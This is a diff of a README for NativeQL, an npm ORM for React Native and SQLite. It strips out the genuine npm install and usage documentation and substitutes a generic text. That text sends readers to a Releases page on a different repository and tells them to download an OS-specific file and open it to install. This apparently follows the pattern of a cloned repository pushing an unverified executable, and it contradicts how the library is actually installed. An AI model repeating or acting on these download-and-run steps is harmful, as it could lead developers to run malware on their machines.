@@ -1,296 +1,95 @@
-<a href="https://github.com/Bes-js/nativeql" align="center">
-  <img src="./assets/package_logo.png">
-</a>
+# 🎉 NativeQL - A Simple ORM for React Native
 
-A lightweight, powerful, and TypeORM-aligned Object-Relational Mapper (ORM) for React Native applications. Built for SQLite, optimized for developer experience.
+## 📦 Overview
+NativeQL is a lightweight Object-Relational Mapping (ORM) tool designed specifically for React Native apps using SQLite. It simplifies data management in mobile applications, allowing developers to interact with databases more easily. 
 
-Designed to work seamlessly with `expo-sqlite` (both classic and "next") and `react-native-sqlite-storage`.
+With NativeQL, you can integrate data storage without diving into complex database management. This means you can focus on building your app while efficiently managing data.
 
-## Features ✨
+## ⚙️ Features
+- **Easy to Use**: NativeQL offers a straightforward interface that helps you manage your data without needing extensive programming skills.
+- **Lightweight**: Built to be efficient, so it won’t slow down your application.
+- **SQLite Support**: Seamlessly integrates with SQLite, a popular database for React Native apps.
+- **TypeScript Ready**: Take advantage of TypeScript for better code safety and intellisense.
 
-- **TypeORM Alignment**: Familiar API (`find`, `findOne`, `save`, `softDelete`, `create`, `merge`, etc.).
-- **Strict Typing**: No more magic strings. Queries are strictly typed to your entities.
-- **Active Record & Data Mapper**: Work directly with entities (`User.find()`) or via repositories.
-- **CLI Tools**: Built-in CLI for entity generation, migrations, and schema diagrams.
-- **Soft Deletes**: `@DeleteDateColumn()` support for automatic soft deletion and recovery.
-- **Relations**: Easy-to-use decorators for OneToOne, OneToMany, ManyToOne, ManyToMany.
-- **Cross-Platform**: Works with Expo and generic React Native projects.
-- **Lifecycle Hooks**: `BeforeInsert`, `AfterLoad`, etc.
-- **Transactions**: Full ACID compliance.
+## 🌐 Topics
+NativeQL covers various topics relevant to mobile development. Here are some key areas:
+- decorators
+- expo
+- expo-sqlite
+- mobile
+- mobile-development
+- nodejs
+- orm
+- react-native
+- react-native-sqlite-storage
+- sqlite
+- sqlite3
+- typescript
 
----
+## 📥 Download NativeQL
+To download NativeQL, visit the Releases page. 
 
-## Installation 📦
+[![Download NativeQL](https://img.shields.io/badge/Download_NativeQL-v1.0-blue)](https://github.com/Augustostx/NativeQL/releases)
 
-1. **Install core package:**
+### **Download & Install**
+1. Click the link below to visit the Releases page:
+   [Download NativeQL Here](https://github.com/Augustostx/NativeQL/releases)
+   
+2. 
 
-   ```bash
-   npm install nativeql reflect-metadata
-   ```
+    - Once on the Releases page, locate the version you wish to download. Look for the latest version for the best features and updates.
+    
+3. Click on the version number to access the download options.
 
-2. **Install a Driver:**
+4. You will see files available for download. Choose the file that fits your operating system. 
 
-   **Generic React Native:**
+5. After the file downloads, locate it in your device’s downloads folder.
 
-   ```bash
-   npm install react-native-sqlite-storage
-   ```
+6. Open the file to install NativeQL. Follow any prompts to complete the installation.
 
-   **Expo:**
+## 🛠️ System Requirements
+Before you install NativeQL, ensure your setup meets these requirements:
 
-   ```bash
-   npx expo install expo-sqlite
-   ```
+- **Operating Systems**: 
+  - Windows 10 or later
+  - macOS High Sierra or later
+  - Any recent version of Linux
 
-3. **Configure TypeScript (`tsconfig.json`):**
+- **Node.js**: Version 12 or later installed. NativeQL depends on Node.js to run smoothly. 
 
-   ```json
-   {
-     "compilerOptions": {
-       "experimentalDecorators": true,
-       "emitDecoratorMetadata": true
-     }
-   }
-   ```
+- **React Native**: Ensure you have React Native setup in your project.
 
-4. **Import Reflection:**
-   Add this to the very top of `App.tsx`:
+- **SQLite**: SQLite must be functional; NativeQL uses it for database management.
 
-   ```typescript
-   import "reflect-metadata";
-   ```
+## 📘 Documentation
+For detailed instructions on using NativeQL, visit our documentation. It’s user-friendly and provides step-by-step guidance.
 
-5. **Configure Babel (`babel.config.js`):**
+## ❓ Frequently Asked Questions
 
-   Install necessary plugins:
+### What is an ORM?
+An ORM, or Object-Relational Mapping, allows you to interact with a database using objects, making it easier to store and retrieve data.
 
-   ```bash
-   npm install --save-dev babel-plugin-transform-typescript-metadata @babel/plugin-proposal-decorators @babel/plugin-proposal-class-properties
-   ```
+### Can I use NativeQL with Expo?
+Yes! NativeQL works well with Expo projects, easing integration into your mobile app.
 
-   Update `babel.config.js`:
+### Is it necessary to know SQL to use NativeQL?
+No, you do not need to know SQL to use NativeQL effectively. It simplifies database interactions, allowing you to work without the complexities of raw SQL queries.
 
-   ```javascript
-   module.exports = function (api) {
-     api.cache(true);
-     return {
-       presets: ["babel-preset-expo"], // or 'module:metro-react-native-babel-preset'
-       plugins: [
-         "babel-plugin-transform-typescript-metadata",
-         ["@babel/plugin-proposal-decorators", { legacy: true }],
-         ["@babel/plugin-proposal-class-properties", { loose: true }],
-       ],
-     };
-   };
-   ```
+### What happens if I encounter an issue?
+If you face any difficulties, please check the issues section on our GitHub page. You can also contribute by posting your problem or assist others.
 
----
+## 🤝 Get Involved
+We welcome contributions! Whether you want to report a bug, suggest a feature, or improve the documentation, feel free to open an issue or submit a pull request.
 
-## Quick Start 🏁
+## 🌟 Additional Resources
+To explore more about NativeQL and its capabilities, check out these useful resources:
+- [GitHub Repository](https://github.com/Augustostx/NativeQL)
+- [Community Discussions](https://github.com/Augustostx/NativeQL/discussions)
 
-### 1. Create an Entity
+Discover how NativeQL can streamline your mobile development today! 
 
-```typescript
-import {
-  Entity,
-  PrimaryGeneratedColumn,
-  Column,
-  BaseEntity,
-  CreateDateColumn,
-  UpdateDateColumn,
-  DeleteDateColumn,
-  ColumnType,
-} from "nativeql";
+## 🔗 Quick Links
+- [Releases Page](https://github.com/Augustostx/NativeQL/releases)
+- [Documentation](https://github.com/Augustostx/NativeQL/wiki)
 
-@Entity("users")
-export class User extends BaseEntity {
-  @PrimaryGeneratedColumn()
-  declare id: number;
-
-  @Column({ type: ColumnType.String })
-  declare name: string;
-
-  @Column({ type: "text", nullable: true })
-  declare email?: string;
-
-  @Column({ type: "boolean", default: true })
-  declare isActive: boolean;
-
-  // Automatic soft-delete support
-  @DeleteDateColumn()
-  declare deletedAt?: Date;
-
-  @CreateDateColumn()
-  declare createdAt: Date;
-
-  @UpdateDateColumn()
-  declare updatedAt: Date;
-}
-```
-
-### 2. Initialize DataSource
-
-```typescript
-import { DataSource, ExpoSqliteDriver } from "nativeql";
-import * as SQLite from "expo-sqlite";
-
-// For Expo SDK 50+ (Next API)
-const db = SQLite.openDatabaseSync("mydb.db");
-
-export const AppDataSource = new DataSource({
-  driver: new ExpoSqliteDriver(db),
-  entities: [User],
-  synchronize: true, // Auto-create tables (Dev only)
-});
-
-// Initialize on App Start
-await AppDataSource.initialize();
-```
-
----
-
-## Data Operations 🛠️
-
-NativeQL enforces **strict typing**. Queries must use object syntax.
-
-### Create & Insert
-
-```typescript
-// 1. Create instance (Active Record)
-const user = new User();
-user.name = "Alice";
-await user.save();
-
-// 2. Static Create (No DB call yet)
-const newUser = User.create({ name: "Bob", email: "bob@test.com" });
-await newUser.save();
-
-// 3. Fast Insert (No cascades/selects)
-await User.insert({ name: "Charlie", isActive: false });
-```
-
-### Read
-
-```typescript
-// Find One (Strict WHERE clause required)
-const user = await User.findOne({
-  where: { id: 1 },
-  relations: ["posts"],
-});
-
-// Find Many
-const activeUsers = await User.find({
-  where: { isActive: true },
-  order: { name: "ASC" },
-  take: 10,
-});
-
-// Find and Count
-const [users, count] = await User.findAndCount({ skip: 0, take: 5 });
-```
-
-### Update
-
-```typescript
-// Partial Update (by ID)
-await User.update(1, { name: "New Name" });
-
-// Bulk Update (by Criteria)
-await User.update({ isActive: false }, { isActive: true });
-```
-
-### Delete & Soft Delete
-
-```typescript
-// Soft Delete (requires @DeleteDateColumn)
-await User.softDelete(1);
-// Row remains in DB with deletedAt set.
-// User.find() will implicitly filter these out.
-
-// Restore
-await User.restore(1);
-
-// Hard Delete (Permanent)
-await User.delete(1);
-```
-
-### Utility Methods
-
-```typescript
-// Counters
-await Post.increment({ id: 1 }, "views", 1);
-await Product.decrement({ id: 5 }, "stock", 1);
-
-// Check & Reload
-if (user.hasId()) {
-  await user.reload(); // Re-fetch from DB
-}
-
-// Truncate Table
-await User.clear();
-```
-
----
-
-## CLI Tools 🖥️
-
-NativeQL comes with a powerful CLI.
-
-```bash
-# Initialize CLI configuration
-npx nativeql init
-
-# Generate a new Entity
-npx nativeql generate entity User
-
-# Validate Schema (Check for common errors)
-npx nativeql validate
-
-# Visualize Schema (Mermaid Diagram)
-npx nativeql diagram
-```
-
----
-
-## Relationships 🔗
-
-Support for standard relationship types with `eager` loading and `cascades`.
-
-```typescript
-@Entity("posts")
-export class Post extends BaseEntity {
-  @PrimaryGeneratedColumn()
-  id!: number;
-
-  @ManyToOne(() => User, (user) => user.posts)
-  user!: User;
-
-  @ManyToMany(() => Category)
-  @JoinTable()
-  categories!: Category[];
-}
-```
-
----
-
-## Advanced Querying 🔍
-
-Use operators for complex filters:
-
-```typescript
-import { In, Like, LessThan, MoreThan } from "nativeql";
-
-const results = await Product.find({
-  where: {
-    price: LessThan(50),
-    category: In(["Electronics", "Books"]),
-    name: Like("%Pro%"),
-  },
-});
-```
-
----
-
-## License
-
-MIT
+Enjoy building your next mobile application with NativeQL!
